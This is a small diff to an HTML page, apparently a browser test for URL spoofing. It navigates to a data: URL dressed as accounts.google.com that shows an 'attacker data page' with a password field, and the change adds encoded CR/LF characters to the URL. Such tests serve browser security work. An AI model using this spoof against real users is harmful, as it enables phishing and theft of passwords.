@@ -1,6 +1,6 @@
 <script>
 function f(){
-  location = "data://accounts.google.com/,<title>accounts.google.com</title><h1>attacker data page</h1><input autofocus placeholder=password>";
+  location = "data://accounts.google.com/%0a%0d,<title>accounts.google.com</title><h1>attacker data page</h1><input autofocus placeholder=password>";
 }
 </script>
 <a href="#" onclick="f()">click</a>
